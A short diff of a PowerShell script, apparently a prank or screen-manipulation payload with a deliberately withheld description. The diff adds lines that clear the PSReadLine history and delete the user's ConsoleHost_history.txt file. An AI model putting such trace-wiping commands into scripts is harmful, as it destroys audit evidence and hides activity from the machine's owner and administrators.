@@ -3,6 +3,9 @@
 # Description: None - figure it out yourself if you are interested.
 
 IF(1){
+	[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+	del $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+	clear
 	Add-Type -AssemblyName System.Windows.Forms;
 	$S=[System.Windows.Forms.SystemInformation]::VirtualScreen;
 	$K=10;$T=0;$X=0;$Y=0;$px=0;$py=0;$dX=0;$dY=0;
